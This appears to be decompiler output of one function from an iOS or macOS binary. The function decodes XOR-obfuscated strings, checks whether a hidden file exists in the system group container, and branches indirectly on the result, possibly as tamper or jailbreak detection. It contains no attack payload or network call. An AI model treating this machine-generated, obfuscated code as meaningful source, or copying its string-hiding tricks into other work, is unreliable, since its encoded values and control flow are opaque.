/*
 * func-name: sub_18880
 * func-address: 0x18880
 * export-type: decompile
 * callers: none
 * callees: 0x1b158, 0x51af0, 0x51b08, 0x51b38
 */

void sub_18880()
{
  unsigned int *v0; // x19
  __int64 v1; // x29
  id v2; // x19
  id v3; // x0
  id v4; // x20
  NSFileManager *v5; // x20
  unsigned int v6; // w24
  __int64 v7; // kr00_8
  __int64 v8; // [xsp-190h] [xbp-190h] BYREF
  __int64 v9; // [xsp-D0h] [xbp-D0h] BYREF
  __int64 v10; // [xsp-50h] [xbp-50h] BYREF

  byte_72266 = ~byte_72259 & 0xE3 | byte_72259 & 0x1C;
  byte_72267 = byte_7225A ^ 0xA5;
  byte_72268 = ~byte_7225B & 0x8A | byte_7225B & 0x75;
  byte_72269 = byte_7225C - 2 * (byte_7225C & 0x3F) + 63;
  byte_7226A = byte_7225D ^ 0xA4;
  byte_7226B = byte_7225E ^ 0x83;
  byte_7226C = byte_7225F ^ 0x92;
  byte_7226D = (~byte_72260 | 0x9D) & (byte_72260 | 0x62);
  byte_7226E = byte_72261 ^ 0xDC;
  byte_7226F = ~(byte_72262 & 0x74 | ~byte_72262 & 0x8B);
  byte_72270 = byte_72263 - 2 * (byte_72263 & 0xD) + 13;
  byte_72271 = byte_72264 ^ 0xA9;
  byte_72272 = byte_72265 ^ 0x3A;
  a0Z[0] = (~byte_72280 & 0x4E | byte_72280 & 0xB1) ^ 0x54;
  a0Z[1] = byte_72281 ^ 0x6C;
  a0Z[2] = byte_72282 - 2 * (byte_72282 & 0x5C) + 92;
  a0Z[3] = byte_72283 ^ 0x56;
  a0Z[4] = byte_72284 ^ 0xC2;
  a0Z[5] = (~byte_72285 | 0x17) & (byte_72285 | 0xE8);
  a0Z[6] = byte_72286 ^ 0xDE;
  a0Z[7] = (~byte_72287 | 0x17) & (byte_72287 | 0xE8);
  a0Z[8] = ~byte_72288 & 0xE5 | byte_72288 & 0x1A;
  a0Z[9] = byte_72289 ^ 0x15;
  a0Z[10] = byte_7228A - 2 * (byte_7228A & 0xEE) - 18;
  a0Z[11] = byte_7228B ^ 0x67;
  a0Z[12] = byte_7228C ^ 0xAE;
  a0Z[13] = ~byte_7228D & 0x5C | byte_7228D & 0xA3;
  a0Z[14] = byte_7228E - 2 * (byte_7228E & 0x28) + 40;
  a0Z[15] = byte_7228F ^ 0x19;
  a0Z[16] = ~byte_72290 & 0xA3 | byte_72290 & 0x5C;
  a0Z[17] = byte_72291 ^ 0xAE;
  a0Z[18] = ~byte_72292 & 0x78 | byte_72292 & 0x87;
  a0Z[19] = byte_72293 - 2 * (byte_72293 & 0xB) + 11;
  a0Z[20] = byte_72294 ^ 0xEE;
  a0Z[21] = (~byte_72295 & 0x7A | byte_72295 & 0x85) ^ 0x75;
  a0Z[22] = ~(~byte_72296 & 0xFC | byte_72296 & 3);
  byte_722E0 = ~byte_722C0 & 0x44 | byte_722C0 & 0xBB;
  byte_722E1 = byte_722C1 - 2 * (byte_722C1 & 0x15) - 107;
  byte_722E2 = byte_722C2 ^ 0xE7;
  byte_722E3 = byte_722C3 ^ 0x8E;
  byte_722E4 = byte_722C4 ^ 0xE5;
  byte_722E5 = (~byte_722C5 & 0x40 | byte_722C5 & 0xBF) ^ 0x72;
  byte_722E6 = (~byte_722C6 & 0x90 | byte_722C6 & 0x6F) ^ 0x60;
  byte_722E7 = byte_722C7 ^ 0xB3;
  byte_722E8 = byte_722C8 - 2 * (byte_722C8 & 0xE3) + 99;
  byte_722E9 = byte_722C9 ^ 0x79;
  byte_722EA = ~((byte_722CA | 0x61) & (~byte_722CA | 0x9E));
  byte_722EB = byte_722CB - 2 * (byte_722CB & 0x7C) - 4;
  byte_722EC = (~byte_722CC & 0x75 | byte_722CC & 0x8A) ^ 0xFD;
  byte_722ED = (~byte_722CD & 0x8E | byte_722CD & 0x71) ^ 0x87;
  byte_722EE = ~byte_722CE & 0x94 | byte_722CE & 0x6B;
  byte_722EF = byte_722CF ^ 0x48;
  byte_722F0 = byte_722D0 - 2 * (byte_722D0 & 0x62) - 30;
  byte_722F1 = byte_722D1 ^ 0x66;
  byte_722F2 = ~((byte_722D2 | 0xF1) & (~byte_722D2 | 0xE));
  byte_722F3 = byte_722D3 ^ 0x36;
  byte_722F4 = byte_722D4 ^ 0xA2;
  byte_722F5 = byte_722D5 ^ 0xA2;
  asc_72320[0] = byte_72300 - 2 * (byte_72300 & 0x62) - 30;
  asc_72320[1] = byte_72301 ^ 0xEE;
  asc_72320[2] = ~byte_72302 & 0x2E | byte_72302 & 0xD1;
  asc_72320[3] = byte_72303 ^ 0xF4;
  asc_72320[4] = ~byte_72304 & 0x4F | byte_72304 & 0xB0;
  asc_72320[5] = byte_72305 ^ 0x3E;
  asc_72320[6] = byte_72306 ^ 0xE9;
  asc_72320[7] = (~byte_72307 & 0xC9 | byte_72307 & 0x36) ^ 0x19;
  asc_72320[8] = ~byte_72308 & 0x86 | byte_72308 & 0x79;
  asc_72320[9] = byte_72309 - 2 * (byte_72309 & 0x6D) - 19;
  asc_72320[10] = ~(byte_7230A & 0xC3 | ~byte_7230A & 0x3C);
  asc_72320[11] = byte_7230B ^ 0x20;
  asc_72320[12] = byte_7230C - 2 * (byte_7230C & 0x7E) + 126;
  asc_72320[13] = ~((byte_7230D | 0xD) & (~byte_7230D | 0xF2));
  asc_72320[14] = byte_7230E ^ 0x57;
  asc_72320[15] = byte_7230F ^ 0xC1;
  asc_72320[16] = (~byte_72310 & 0x24 | byte_72310 & 0xDB) ^ 0xF3;
  asc_72320[17] = byte_72311 ^ 0xB4;
  asc_72320[18] = (~byte_72312 & 0xD6 | byte_72312 & 0x29) ^ 0x8A;
  asc_72320[19] = ~((byte_72313 | 0x1F) & (~byte_72313 | 0xE0));
  asc_72320[20] = byte_72314 ^ 0x1F;
  asc_7233F[0] = (~byte_72335 & 0x81 | byte_72335 & 0x7E) ^ 0x4B;
  asc_7233F[1] = byte_72336 - 2 * (byte_72336 & 0x3A) + 58;
  asc_7233F[2] = byte_72337 - 2 * (byte_72337 & 0x48) - 56;
  asc_7233F[3] = byte_72338 - 2 * (byte_72338 & 0x26) - 90;
  asc_7233F[4] = byte_72339 ^ 0xD;
  asc_7233F[5] = ~byte_7233A & 0x28 | byte_7233A & 0xD7;
  asc_7233F[6] = byte_7233B ^ 0xC0;
  asc_7233F[7] = byte_7233C ^ 0xD7;
  asc_7233F[8] = (~byte_7233D | 0x88) & (byte_7233D | 0x77);
  asc_7233F[9] = byte_7233E ^ 0xB8;
  asc_72358[0] = ~byte_72349 & 0x35 | byte_72349 & 0xCA;
  asc_72358[1] = ~((byte_7234A | 2) & (~byte_7234A | 0xFD));
  asc_72358[2] = byte_7234B - 2 * (byte_7234B & 0x65) - 27;
  asc_72358[3] = byte_7234C ^ 0x48;
  asc_72358[4] = byte_7234D ^ 0xDA;
  asc_72358[5] = (~byte_7234E | 9) & (byte_7234E | 0xF6);
  asc_72358[6] = ~(byte_7234F & 0xA5 | ~byte_7234F & 0x5A);
  asc_72358[7] = ~byte_72350 & 0x6E | byte_72350 & 0x91;
  asc_72358[8] = byte_72351 ^ 0x65;
  asc_72358[9] = byte_72352 ^ 0x37;
  asc_72358[10] = byte_72353 ^ 0x1F;
  asc_72358[11] = (~byte_72354 & 0x1C | byte_72354 & 0xE3) ^ 0x2B;
  asc_72358[12] = (~byte_72355 & 0xBE | byte_72355 & 0x41) ^ 0x48;
  asc_72358[13] = byte_72356 ^ 0xEC;
  asc_72358[14] = byte_72357 ^ 0x90;
  nullsub_1(off_74708);
  atomic_store(1u, v0);
  *(_QWORD *)(v1 - 176) = &v9;
  *(_QWORD *)(v1 - 104) = &v8;
  v2 = objc_retainAutoreleasedReturnValue(objc_msgSend((id)m_LSDefaults, "systemGroupContainerURL"));
  v3 = objc_retainAutoreleasedReturnValue(objc_msgSend(v2, "path"));
  *(_QWORD *)(v1 - 144) = &v10;
  v4 = v3;
  *(_QWORD *)(v1 - 184) = objc_retainAutoreleasedReturnValue(
                            objc_msgSend(
                              v3,
                              "stringByAppendingPathComponent:",
                              CFSTR("\xA3\x1C\xCA\x15Oh\xBB\x1F)\x8DUb\xB9\xAFk\xFD\xFE\xDD\x70D,")));
  objc_release(v4);
  objc_release(v2);
  v5 = objc_retainAutoreleasedReturnValue(+[NSFileManager defaultManager](&OBJC_CLASS___NSFileManager, "defaultManager"));
  v6 = -[NSFileManager fileExistsAtPath:](v5, "fileExistsAtPath:", *(_QWORD *)(v1 - 184));
  objc_release(v5);
  v7 = nullsub_1(*(&off_75708 + v6));
  __asm { BR              X0 }
}
